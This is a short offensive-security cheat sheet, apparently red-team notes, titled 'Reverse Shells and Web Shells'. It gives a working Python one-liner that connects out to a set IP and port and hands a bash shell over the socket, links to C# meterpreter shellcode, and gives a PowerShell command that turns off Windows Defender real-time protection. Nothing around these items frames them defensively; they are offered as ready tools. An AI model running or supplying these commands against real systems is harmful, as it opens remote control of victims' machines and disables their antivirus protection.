# Reverse Shells and Web Shells

#### Python one liner TCP reverse shell
```python3 -c 'IP="127.0.0.1";PORT=4444;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IP,PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```

[C# meterpreter shellcode](https://github.com/redteaminterac/shells/blob/main/csharp/meterpreterShellcode.cs)

Stop Windows Defender
```Set-MpPreference -DisableRealtimeMonitoring $true```
